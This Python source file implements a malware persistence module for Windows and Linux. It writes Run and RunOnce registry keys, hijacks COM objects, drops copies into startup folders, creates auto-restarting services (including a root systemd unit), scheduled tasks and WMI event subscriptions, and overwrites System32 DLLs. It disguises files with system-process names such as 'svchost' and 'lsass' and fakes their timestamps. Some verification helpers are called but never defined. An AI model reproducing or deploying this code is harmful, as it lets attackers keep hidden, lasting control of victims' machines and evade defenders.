import os
import sys
import winreg
import shutil
import tempfile
import subprocess
import random
import string
import base64
from pathlib import Path
from typing import List, Dict, Optional
import logging
import ctypes
from datetime import datetime, timedelta

class PersistenceMethod:
    """Enum-like class for persistence methods"""
    REGISTRY = "registry"
    STARTUP = "startup"
    SERVICE = "service"
    WMI = "wmi"
    SCHEDULED_TASK = "scheduled_task"
    COM_HIJACK = "com_hijack"
    DLL_HIJACK = "dll_hijack"
    BOOTKIT = "bootkit"

class Persistence:
    def __init__(self):
        self.startup_paths = self._get_startup_paths()
        self.logger = logging.getLogger('Persistence')
        self.installed_methods: Dict[str, bool] = {}
        self.last_check = datetime.now()
        
    def _get_startup_paths(self) -> List[str]:
        """Get system-specific startup paths"""
        paths = []
        if os.name == 'nt':  # Windows
            paths.extend([
                os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
                os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\StartUp'),
                os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Programs')
            ])
        else:  # Unix-like
            paths.extend([
                os.path.expanduser('~/.config/autostart'),
                '/etc/xdg/autostart',
                '/etc/init.d',
                '/etc/systemd/system',
                '/usr/local/bin'
            ])
        return paths
        
    def _generate_random_name(self, prefix: str = "") -> str:
        """Generate a random, legitimate-looking name"""
        system_services = [
            "svchost", "wininit", "lsass", "services", "winlogon",
            "csrss", "spoolsv", "explorer", "taskhost", "conhost"
        ]
        
        if prefix:
            base = prefix
        else:
            base = random.choice(system_services)
            
        suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
        return f"{base}_{suffix}"
        
    def _copy_with_timestamp(self, src: str, dst: str) -> bool:
        """Copy file while preserving/randomizing timestamps"""
        try:
            shutil.copy2(src, dst)
            
            # Randomize access/modify times within last month
            now = datetime.now()
            random_time = now - timedelta(
                days=random.randint(1, 30),
                hours=random.randint(0, 23),
                minutes=random.randint(0, 59)
            )
            
            os.utime(dst, (random_time.timestamp(), random_time.timestamp()))
            return True
        except Exception as e:
            self.logger.error(f"Failed to copy file: {str(e)}")
            return False
            
    def install_registry(self, executable_path: str) -> bool:
        """Enhanced registry persistence with multiple methods"""
        if os.name != 'nt':
            return False
            
        success = False
        try:
            # Standard Run keys
            run_keys = [
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
                # Less common keys
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx"),
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"),
                (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load")
            ]
            
            for hkey, key_path in run_keys:
                try:
                    key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE)
                    name = self._generate_random_name("win")
                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    success = True
                except Exception as e:
                    self.logger.debug(f"Failed to set registry key {key_path}: {str(e)}")
                    continue
                    
            # Try COM hijacking
            if self._install_com_hijack(executable_path):
                success = True
                
        except Exception as e:
            self.logger.error(f"Registry persistence failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.REGISTRY] = success
        return success
        
    def _install_com_hijack(self, executable_path: str) -> bool:
        """Install persistence via COM hijacking"""
        try:
            # Common COM objects to hijack
            com_objects = [
                "\\Software\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\LocalServer32",  # Recycle bin
                "\\Software\\Classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\LocalServer32"   # My Computer
            ]
            
            for com_path in com_objects:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, com_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, executable_path)
                    winreg.CloseKey(key)
                    return True
                except:
                    continue
                    
            return False
        except:
            return False
            
    def install_startup(self, executable_path: str) -> bool:
        """Enhanced startup folder persistence"""
        success = False
        try:
            filename = self._generate_random_name() + os.path.splitext(executable_path)[1]
            
            for startup_path in self.startup_paths:
                if os.path.exists(startup_path):
                    target_path = os.path.join(startup_path, filename)
                    if self._copy_with_timestamp(executable_path, target_path):
                        success = True
                        
                    # Create .lnk shortcut on Windows
                    if os.name == 'nt':
                        shortcut_path = os.path.splitext(target_path)[0] + '.lnk'
                        self._create_shortcut(executable_path, shortcut_path)
                        
        except Exception as e:
            self.logger.error(f"Startup persistence failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.STARTUP] = success
        return success
        
    def _create_shortcut(self, target: str, shortcut_path: str) -> bool:
        """Create a Windows shortcut"""
        try:
            if os.name == 'nt':
                cmd = f'powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\'{shortcut_path}\'); $s.TargetPath = \'{target}\'; $s.Save()"'
                subprocess.run(cmd, shell=True, capture_output=True)
                return True
        except:
            pass
        return False
        
    def install_service(self, executable_path: str) -> bool:
        """Enhanced service installation"""
        success = False
        service_name = self._generate_random_name("svc")
        
        try:
            if os.name == 'nt':  # Windows
                # Try multiple service types
                service_types = [
                    ('own', 'SERVICE_WIN32_OWN_PROCESS'),
                    ('share', 'SERVICE_WIN32_SHARE_PROCESS'),
                    ('kernel', 'SERVICE_KERNEL_DRIVER')
                ]
                
                for svc_type, _ in service_types:
                    try:
                        cmd = f'sc create "{service_name}" binPath= "{executable_path}" type= {svc_type} start= auto'
                        result = subprocess.run(cmd, shell=True, capture_output=True)
                        if result.returncode == 0:
                            # Set recovery options
                            subprocess.run(f'sc failure "{service_name}" reset= 0 actions= restart/60000/restart/60000/restart/60000', shell=True)
                            success = True
                            break
                    except:
                        continue
                        
            else:  # Unix-like
                service_content = f'''[Unit]
Description=System Management Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart={executable_path}
Restart=always
RestartSec=1
User=root

[Install]
WantedBy=multi-user.target
'''
                
                try:
                    service_path = f"/etc/systemd/system/{service_name}.service"
                    with open(service_path, 'w') as f:
                        f.write(service_content)
                    subprocess.run(['systemctl', 'daemon-reload'])
                    subprocess.run(['systemctl', 'enable', service_name])
                    success = True
                except Exception as e:
                    self.logger.error(f"Failed to create service: {str(e)}")
                    
        except Exception as e:
            self.logger.error(f"Service installation failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.SERVICE] = success
        return success
        
    def install_scheduled_task(self, executable_path: str) -> bool:
        """Install persistence via scheduled tasks"""
        if os.name != 'nt':
            return False
            
        success = False
        task_name = self._generate_random_name("task")
        
        try:
            # Create task with multiple triggers
            triggers = [
                ('ONLOGON', ''),
                ('ONSTART', ''),
                ('DAILY', '/ri 1440'),  # Every day
                ('ONIDLE', '/i 10')     # After 10 minutes idle
            ]
            
            for trigger, extra in triggers:
                try:
                    cmd = f'schtasks /create /tn "{task_name}" /tr "{executable_path}" /sc {trigger} {extra} /f'
                    result = subprocess.run(cmd, shell=True, capture_output=True)
                    if result.returncode == 0:
                        success = True
                        break
                except:
                    continue
                    
        except Exception as e:
            self.logger.error(f"Scheduled task creation failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.SCHEDULED_TASK] = success
        return success
        
    def install_wmi(self, executable_path: str) -> bool:
        """Install persistence via WMI event subscription"""
        if os.name != 'nt':
            return False
            
        success = False
        try:
            # Create WMI event subscription
            namespace = "\\\\.\\root\\subscription"
            query = f'''
            SELECT * FROM __InstanceModificationEvent WITHIN 60
            WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
            '''
            
            cmd = f'''powershell -Command "$filter = Set-WmiInstance -Class __EventFilter -Namespace '{namespace}' -Arguments @{{
                Name = '{self._generate_random_name("evt")}';
                EventNameSpace = 'root\\Cimv2';
                QueryLanguage = 'WQL';
                Query = '{query}'
            }};
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace '{namespace}' -Arguments @{{
                Name = '{self._generate_random_name("cmd")}';
                ExecutablePath = '{executable_path}';
                CommandLineTemplate = '{executable_path}'
            }};
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace '{namespace}' -Arguments @{{
                Filter = $filter;
                Consumer = $consumer
            }};"'''
            
            result = subprocess.run(cmd, shell=True, capture_output=True)
            success = result.returncode == 0
            
        except Exception as e:
            self.logger.error(f"WMI persistence failed: {str(e)}")
            
        self.installed_methods[PersistenceMethod.WMI] = success
        return success
        
    def _install_dll_hijack(self, executable_path: str) -> bool:
        """Install persistence via DLL hijacking"""
        if os.name != 'nt':
            return False
            
        try:
            # Common DLL hijacking targets
            dll_targets = [
                "C:\\Windows\\System32\\wbem\\wbemcomn.dll",
                "C:\\Windows\\System32\\Windows.Storage.dll",
                "C:\\Windows\\System32\\cryptbase.dll"
            ]
            
            for target in dll_targets:
                try:
                    if os.path.exists(target):
                        backup_path = target + '.bak'
                        if not os.path.exists(backup_path):
                            os.rename(target, backup_path)
                        shutil.copy2(executable_path, target)
                        return True
                except:
                    continue
                    
            return False
        except:
            return False
            
    def verify_persistence(self) -> Dict[str, bool]:
        """Verify all installed persistence methods are still active"""
        if datetime.now() - self.last_check < timedelta(hours=1):
            return self.installed_methods
            
        for method, was_installed in self.installed_methods.items():
            if not was_installed:
                continue
                
            # Verify each method
            if method == PersistenceMethod.REGISTRY:
                self._verify_registry()
            elif method == PersistenceMethod.STARTUP:
                self._verify_startup()
            elif method == PersistenceMethod.SERVICE:
                self._verify_service()
            elif method == PersistenceMethod.SCHEDULED_TASK:
                self._verify_scheduled_task()
            elif method == PersistenceMethod.WMI:
                self._verify_wmi()
                
        self.last_check = datetime.now()
        return self.installed_methods
        
    def install_all(self, executable_path: str) -> Dict[str, bool]:
        """Try all persistence methods"""
        # First, copy to a stealthy permanent location
        try:
            system_dirs = [
                os.path.join(os.getenv('SYSTEMROOT'), 'System32'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft\\Windows\\Start Menu\\Programs'),
                os.path.join(tempfile.gettempdir(), '.cache')
            ]
            
            for install_dir in system_dirs:
                try:
                    os.makedirs(install_dir, exist_ok=True)
                    new_name = self._generate_random_name() + os.path.splitext(executable_path)[1]
                    permanent_path = os.path.join(install_dir, new_name)
                    
                    if self._copy_with_timestamp(executable_path, permanent_path):
                        executable_path = permanent_path
                        break
                except:
                    continue
                    
        except Exception as e:
            self.logger.error(f"Failed to copy to permanent location: {str(e)}")
            
        # Try all persistence methods
        methods = [
            self.install_registry,
            self.install_startup,
            self.install_service,
            self.install_scheduled_task,
            self.install_wmi,
            self._install_dll_hijack
        ]
        
        for method in methods:
            try:
                method(executable_path)
            except Exception as e:
                self.logger.error(f"Method {method.__name__} failed: {str(e)}")
                
        return self.verify_persistence()
